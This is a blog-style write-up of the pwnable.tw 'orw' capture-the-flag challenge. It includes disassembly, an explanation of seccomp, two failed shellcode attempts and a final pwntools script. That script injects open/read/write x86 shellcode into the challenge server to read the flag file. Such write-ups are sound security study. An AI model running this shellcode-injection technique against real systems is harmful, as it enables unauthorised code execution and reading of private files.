# For orw from pwnable.tw

This challenge was given.
>Read the flag from `/home/orw/flag`.
>Only `open read write` syscall are allowed to use.
>`nc chall.pwnable.tw 10001`

Below is my first encounter with the program. It's pretty standard stuff.
```
solomonbstoner@swjsUbuntu:~/Desktop$ ./orw 
Give my your shellcode:aaaaaaaaaaaaaaaaaabbbbbbbbbbbbbcccccccccccccccddddddddddddddeeeeeeeeeeeeeffffffffffffffggggggggggghhhhhhhhhiiiiiiiiii
Segmentation fault (core dumped)
```
The `segmentation fault` tells me that memory that should not be accessed is being accessed.

I did a `objdump` to get an overview of what I am dealing with. `<orw_seccomp>` and `<main>` are the 2 user defined functions in this program.
```
080484cb <orw_seccomp>:
 80484cb:	55                   	push   ebp
 80484cc:	89 e5                	mov    ebp,esp
 80484ce:	57                   	push   edi
 80484cf:	56                   	push   esi
 80484d0:	53                   	push   ebx
 80484d1:	83 ec 7c             	sub    esp,0x7c		;allocate 0x7c bytes of space
 80484d4:	65 a1 14 00 00 00    	mov    eax,gs:0x14
 80484da:	89 45 e4             	mov    DWORD PTR [ebp-0x1c],eax
 80484dd:	31 c0                	xor    eax,eax
 80484df:	8d 45 84             	lea    eax,[ebp-0x7c]
 80484e2:	bb 40 86 04 08       	mov    ebx,0x8048640
 80484e7:	ba 18 00 00 00       	mov    edx,0x18
 80484ec:	89 c7                	mov    edi,eax
 80484ee:	89 de                	mov    esi,ebx
 80484f0:	89 d1                	mov    ecx,edx
 80484f2:	f3 a5                	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
 80484f4:	66 c7 85 7c ff ff ff 	mov    WORD PTR [ebp-0x84],0xc
 80484fb:	0c 00 
 80484fd:	8d 45 84             	lea    eax,[ebp-0x7c]
 8048500:	89 45 80             	mov    DWORD PTR [ebp-0x80],eax
 8048503:	83 ec 0c             	sub    esp,0xc
 8048506:	6a 00                	push   0x0
 8048508:	6a 00                	push   0x0
 804850a:	6a 00                	push   0x0
 804850c:	6a 01                	push   0x1
 804850e:	6a 26                	push   0x26
 8048510:	e8 9b fe ff ff       	call   80483b0 <prctl@plt>   ; (1) prctl(0x26, 0x1, 0x0, 0x0, 0x0)
 8048515:	83 c4 20             	add    esp,0x20
 8048518:	83 ec 04             	sub    esp,0x4
 804851b:	8d 85 7c ff ff ff    	lea    eax,[ebp-0x84]
 8048521:	50                   	push   eax
 8048522:	6a 02                	push   0x2
 8048524:	6a 16                	push   0x16
 8048526:	e8 85 fe ff ff       	call   80483b0 <prctl@plt>	; (1) prctl(0x16, 0x2, [ebp-0x84])
 804852b:	83 c4 10             	add    esp,0x10
 804852e:	90                   	nop
 804852f:	8b 45 e4             	mov    eax,DWORD PTR [ebp-0x1c]
 8048532:	65 33 05 14 00 00 00 	xor    eax,DWORD PTR gs:0x14    ; (2)
 8048539:	74 05                	je     8048540 <orw_seccomp+0x75>
 804853b:	e8 50 fe ff ff       	call   8048390 <__stack_chk_fail@plt>	; (3)
 8048540:	8d 65 f4             	lea    esp,[ebp-0xc]
 8048543:	5b                   	pop    ebx
 8048544:	5e                   	pop    esi
 8048545:	5f                   	pop    edi
 8048546:	5d                   	pop    ebp
 8048547:	c3                   	ret    
```
I ~~have~~ had no idea what is being done by `orw_seccomp`. A very ~~Fun~~ important fact ~~though~~, `seccomp()` is a [legit Linux function](http://man7.org/linux/man-pages/man2/seccomp.2.html). ヽ(ﾟДﾟ)ﾉ

(1) - ~~Some weird~~ A very important [C function](http://man7.org/linux/man-pages/man2/prctl.2.html),
Update: I never knew of its purpose until I realised it is an intricate part of [seccomp](https://www.kernel.org/doc/Documentation/prctl/seccomp_filter.txt).

(2) - I noticed `gs:0x14` appeared quite a number of times in different programs, a value in the stack was compared to determine if `__stack_chk_fail@plt` should be called. Turns out the purpose of *is* to validate that the stack has not been corrupted. See [here](https://stackoverflow.com/questions/9249315/what-is-gs-in-assembly).

(3) - The interface `__stack_chk_fail()` shall abort the function that called it with a message that a stack overflow has been detected (by checking if the value of a super secret variable in the stack has been altered). The program that called the function shall then exit.

Update: I initially thought `orw_seccomp` was useless. After finishing this challenge, I realised`syscalls` like `execve` actually could not work, like something was preventing it from working. That *something* had to be `orw_seccomp`, and only then I found out that `orw_seccomp` was part of [**SECure COMPuting with filters**](https://www.kernel.org/doc/Documentation/prctl/seccomp_filter.txt).
> A certain subset of userland applications benefit by having a reduced set of available system calls.  The resulting set reduces the total kernel surface exposed to the application.  System call filtering is meant for use with those applications.  

`orw_seccomp` is definitely how other syscalls were banned. See [here for a tutorial](https://blog.yadutaf.fr/2014/05/29/introduction-to-seccomp-bpf-linux-syscall-filter/).

This is the `objdump` of `main`, along with my comments on the side.
```
08048548 <main>:
 8048548:	8d 4c 24 04          	lea    ecx,[esp+0x4]
 804854c:	83 e4 f0             	and    esp,0xfffffff0
 804854f:	ff 71 fc             	push   DWORD PTR [ecx-0x4]
 8048552:	55                   	push   ebp
 8048553:	89 e5                	mov    ebp,esp
 8048555:	51                   	push   ecx
 8048556:	83 ec 04             	sub    esp,0x4			;allocated 0x4 bytes of space
 8048559:	e8 6d ff ff ff       	call   80484cb <orw_seccomp>
 804855e:	83 ec 0c             	sub    esp,0xc			;allocated 0xc bytes of space
 8048561:	68 a0 86 04 08       	push   0x80486a0	;location of "Give my your shellcode:"
 8048566:	e8 15 fe ff ff       	call   8048380 <printf@plt>
 804856b:	83 c4 10             	add    esp,0x10
 804856e:	83 ec 04             	sub    esp,0x4
 8048571:	68 c8 00 00 00       	push   0xc8
 8048576:	68 60 a0 04 08       	push   0x804a060
 804857b:	6a 00                	push   0x0
 804857d:	e8 ee fd ff ff       	call   8048370 <read@plt>	; read(stdin, *0x804a060, 0xc8)
 8048582:	83 c4 10             	add    esp,0x10
 8048585:	b8 60 a0 04 08       	mov    eax,0x804a060
 804858a:	ff d0                	call   eax			;runs user input as code
 804858c:	b8 00 00 00 00       	mov    eax,0x0
 8048591:	8b 4d fc             	mov    ecx,DWORD PTR [ebp-0x4]
 8048594:	c9                   	leave  
 8048595:	8d 61 fc             	lea    esp,[ecx-0x4]
 8048598:	c3                   	ret    
 8048599:	66 90                	xchg   ax,ax
 804859b:	66 90                	xchg   ax,ax
 804859d:	66 90                	xchg   ax,ax
 804859f:	90                   	nop
```
From the `<main>` function, we can tell that the user input is being run directly, just as we see in exploit-exercises.

This below is the proof that the input is being run. The segfault occures in `0x0804a06b` as the character `'a'` has the same byte as a valid instruction `"popa"`. 
```
(gdb) c
Continuing.
Give my your shellcode:aaaaaaaaaaabbbbbbbbbbbccccccccccddddddddddeeeeeeeeeeffffffffffgggggggggghhhhhhhhhhiiiiiiiiiijjjjjjjjjjkkkkkkkkkkllllllllllmmmmmmmmmmmnnnnnnnnnnooooooooooopppppppppp

Program received signal SIGSEGV, Segmentation fault.
0x0804a06b in shellcode ()
=> 0x0804a06b <shellcode+11>:	62 62 62	bound  esp,QWORD PTR [edx+0x62]
(gdb) x/s 0x804a06b
0x804a06b <shellcode+11>:	'b' <repeats 11 times>, "ccccccccccddddddddddeeeeeeeeeeffffffffffgggggggggghhhhhhhhhhiiiiiiiiiijjjjjjjjjjkkkkkkkkkkllllllllll", 'm' <repeats 11 times>, "nnnnnnnnnn", 'o' <repeats 11 times>, "pppppppppp\n"
(gdb) x/s 0x804a060
0x804a060 <shellcode>:	'a' <repeats 11 times>, 'b' <repeats 11 times>, "ccccccccccddddddddddeeeeeeeeeeffffffffffgggggggggghhhhhhhhhhiiiiiiiiiijjjjjjjjjjkkkkkkkkkkllllllllll", 'm' <repeats 11 times>, "nnnnnnnnnn", 'o' <repeats 11 times>, "pppppppppp\n"
(gdb) x/5i 0x804a060
   0x804a060 <shellcode>:	popa   
   0x804a061 <shellcode+1>:	popa   
   0x804a062 <shellcode+2>:	popa   
   0x804a063 <shellcode+3>:	popa   
   0x804a064 <shellcode+4>:	popa   
(gdb) 
```

### Testing a concept
Armed with the knowledge above, I began my attempts to exploit this vulnerability.
This is my first attempt:
```
mov eax, 0x5
push 0x67616c66
push 0x2f77726f
push 0x2f656d6f
push 0x682f
mov ebx, esp
xor ecx, ecx
xor edx, edx
int 0x80	;open("/home/orw/flag", 0x0, 0x0)
mov edi, eax

read:
mov ebx, edi	;edi stores the fd of the file we opened. 
mov eax, 0x3
mov ecx, esp	;store the character in the stack
mov edx, 0x1	;read 1 character from the flag file
int 0x80	;read(file, top of stack, 1 char)

inc eax
xor ebx,ebx
mov ecx, esp
int 0x80	;write(stdout, top of stack, 1 char)

cmp ecx, 0x0
jne read

String literal:
\xB8\x05\x00\x00\x00\x68\x66\x6C\x61\x67\x68\x6F\x72\x77\x2F\x68\x6F\x6D\x65\x2F\x68\x2F\x68\x00\x00\x89\xE3\x31\xC9\x31\xD2\xCD\x80\x89\xC7\x89\xFB\xB8\x03\x00\x00\x00\x89\xE1\xBA\x01\x00\x00\x00\xCD\x80\x40\x31\xDB\x89\xE1\xCD\x80\x83\xF9\x00\x75\xE4
```

First attempt was a *disasterous failure*. The program fell into an infinite loop. See the embarassing output below.
```

(gdb) run < exploit\ for\ orw 
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/solomonbstoner/Desktop/orw < exploit\ for\ orw
Give my your shellcode:
Breakpoint 2, 0x0804858a in main ()
=> 0x0804858a <main+66>:	ff d0	call   eax
(gdb) ni
^C
Program received signal SIGINT, Interrupt.
0x0804a09a in shellcode ()
=> 0x0804a09a <shellcode+58>:	83 f9 00	cmp    ecx,0x0
(gdb) 

```
When I tested with the actual server, I *do not know* why but there was no output. My shellcode was supposed to output a shellcode. (╯°□°）╯︵ ┻━┻ 
```
solomonbstoner@swjsUbuntu:~/Desktop$ cat exploit\ for\ orw | nc chall.pwnable.tw 10001
Give my your shellcode:solomonbstoner@swjsUbuntu:~/Desktop$ cat exploit\ for\ orw | nc chall.pwnable.tw 10001
```

#### Reattempting the challenge

Perhaps what I did was too complicated. So I decided to, instead of reading and writing one character of the flag at a time, I would read multiple characters at once, then write them out together.
This is my Second attempt:
```
mov eax, 0x5
push 0x0
push 0x67616c66
push 0x2f77726f
push 0x2f656d6f
push 0x682f0000
mov ebx, esp
xor ecx, ecx
xor edx, edx
int 0x80
push eax
mov eax, 0x3
pop ebx
mov ecx,0x804a100
mov edx, 0x28
int 0x80
mov al, 0x4
xor ebx,ebx
mov ecx, 0x804a100
int 0x80

String literal:
\xB8\x05\x00\x00\x00\x6A\x00\x68\x66\x6C\x61\x67\x68\x6F\x72\x77\x2F\x68\x6F\x6D\x65\x2F\x68\x00\x00\x2F\x68\x89\xE3\x31\xC9\x31\xD2\xCD\x80\x50\xB8\x03\x00\x00\x00\x5B\xB9\x00\xA1\x04\x08\xBA\x28\x00\x00\x00\xCD\x80\xB0\x04\x31\xDB\xB9\x00\xA1\x04\x08\xCD\x80
```

Even the 2nd attempt is not working. See below for the humiliating defeat. ᕙ(⇀‸↼‶)ᕗ
```
(gdb) x/32i $eax
   0x804a060 <shellcode>:	mov    eax,0x5
   0x804a065 <shellcode+5>:	push   0x67616c66
   0x804a06a <shellcode+10>:	push   0x2f77726f
   0x804a06f <shellcode+15>:	push   0x2f656d6f
   0x804a074 <shellcode+20>:	push   0x682f0000
   0x804a079 <shellcode+25>:	add    bl,ah
   0x804a07b <shellcode+27>:	xor    ecx,ecx
   0x804a07d <shellcode+29>:	xor    edx,edx
   0x804a07f <shellcode+31>:	int    0x80
   0x804a081 <shellcode+33>:	add    bl,al
   0x804a083 <shellcode+35>:	mov    eax,0x3
   0x804a088 <shellcode+40>:	mov    ecx,0x804a100
   0x804a08d <shellcode+45>:	mov    edx,0x28
   0x804a092 <shellcode+50>:	int    0x80
   0x804a094 <shellcode+52>:	mov    al,0x4
   0x804a096 <shellcode+54>:	xor    ebx,ebx
   0x804a098 <shellcode+56>:	mov    ecx,0x804a100
   0x804a09d <shellcode+61>:	int    0x80
   0x804a09f <shellcode+63>:	or     al,BYTE PTR [eax]
   0x804a0a1 <shellcode+65>:	add    BYTE PTR [eax],al
   0x804a0a3 <shellcode+67>:	add    BYTE PTR [eax],al
   0x804a0a5 <shellcode+69>:	add    BYTE PTR [eax],al
   0x804a0a7 <shellcode+71>:	add    BYTE PTR [eax],al
   0x804a0a9 <shellcode+73>:	add    BYTE PTR [eax],al
   0x804a0ab <shellcode+75>:	add    BYTE PTR [eax],al
   0x804a0ad <shellcode+77>:	add    BYTE PTR [eax],al
   0x804a0af <shellcode+79>:	add    BYTE PTR [eax],al
   0x804a0b1 <shellcode+81>:	add    BYTE PTR [eax],al
   0x804a0b3 <shellcode+83>:	add    BYTE PTR [eax],al
   0x804a0b5 <shellcode+85>:	add    BYTE PTR [eax],al
   0x804a0b7 <shellcode+87>:	add    BYTE PTR [eax],al
   0x804a0b9 <shellcode+89>:	add    BYTE PTR [eax],al
```

### Picking up what's left of my dignity

So, I decided to find out where I went wrong. I realised that I made a *grave mistake*:
```
push 0x0
push 0x67616c66
push 0x2f77726f
push 0x2f656d6f
push 0x682f0000
mov ebx, esp    <- The big failure is here
```
That mistake results in `ebx` pointing to `"\0\0/home/orw/flag"`. There are 2 extra `\0`. That is why my program never returned a flag; because the shell could not even open the file.

So, I changed `mov ebx, esp` to `lea ebx, [esp +0x2]` to remove the 2 `\0` characters.

I got the shellcode in the following exploit script
```
from pwn import *

p = remote("chall.pwnable.tw", 10001)

shellcode='''

open:
push 0x0
push 0x67616c66
push 0x2f77726f
push 0x2f656d6f
push 0x682f0000
mov eax, 0x5
lea ebx, [esp+0x2]
xor ecx, ecx
xor edx, edx
int 0x80

read:
mov ebx, eax
mov eax, 0x3
mov ecx, esp
mov edx, 0x28
int 0x80

write:
mov eax, 0x4
mov ebx, 0x1
mov ecx, esp
int 0x80


'''

shellcode= asm(shellcode)
p.recvuntil(":")
p.send(shellcode)

p.interactive()
```

The fix worked! And I got my flag ｡\^‿\^｡ (By the way, `p.interactive()` is needed. Without it, the flag won't be printed.)
```
solomonbstoner@swjsUbuntu:~/Desktop$ python python\ exploit\ for\ orw.py 
[+] Opening connection to chall.pwnable.tw on port 10001: Done
[*] Switching to interactive mode
FLAG{sh3llc0ding_w1th_op3n_r34d_writ3}
�[*] Got EOF while reading in interactive
$ 
[*] Interrupted
[*] Closed connection to chall.pwnable.tw port 10001
```

END